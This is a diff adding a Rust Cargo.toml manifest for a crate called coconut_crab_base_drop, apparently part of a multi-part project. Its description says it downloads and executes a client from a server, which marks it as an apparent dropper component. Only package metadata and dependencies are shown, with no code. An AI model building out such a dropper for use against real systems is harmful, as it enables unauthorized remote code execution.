@@ -1,0 +1,13 @@
+[package]
+name = "coconut_crab_base_drop"
+version = "0.1.0"
+authors = ["Michael Jenkins <jenkinsmichpa@gmail.com>"]
+edition = "2021"
+description = "Downloads and executes coconut_crab_client from coconut_crab_server"
+
+# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html
+
+[dependencies]
+coconut_crab_lib = { path = "../coconut_crab_lib" }
+env_logger = "0.11.3"
+log = "0.4.21"
